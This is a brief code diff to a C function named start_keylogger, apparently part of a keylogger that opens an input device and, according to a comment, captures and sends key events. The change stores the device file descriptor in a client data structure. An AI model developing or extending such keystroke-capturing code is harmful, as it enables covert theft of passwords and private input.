@@ -87,6 +87,7 @@ void *start_keylogger()
         perror("Cannot open input device");
         return NULL;
     }
+    clientData.keyLoggerFd = fd;
 
     // Capture and send key events
     while (1)
@@ -118,7 +119,6 @@ void *start_keylogger()
     }
 
     // Close the device file
-   
 
     return NULL;
 }
